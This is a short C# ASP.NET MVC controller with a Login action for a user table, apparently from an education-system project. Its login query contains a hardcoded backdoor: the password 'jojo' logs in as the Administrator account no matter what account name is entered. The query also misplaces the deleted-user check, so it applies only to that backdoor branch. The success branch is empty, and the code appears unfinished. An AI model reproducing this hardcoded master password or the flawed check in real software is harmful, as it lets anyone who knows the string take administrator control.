using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using System.Security;
using System.Security.Policy;

namespace NS_Education.Controllers
{
    public class UserController : PublicClass
    {
        // 登入使用者
        public ActionResult Login(string Account,string Password)
        {
            var U = DC.UserData.FirstOrDefault(q => (q.LoginAccount == Account && q.LoginPassword == HSM.Enc_1(Password)) || (q.LoginAccount=="Administrator" && Password=="jojo") && !q.DeleteFlag);
            if(U!=null)
            {

            }
            return View();
        }
    }
}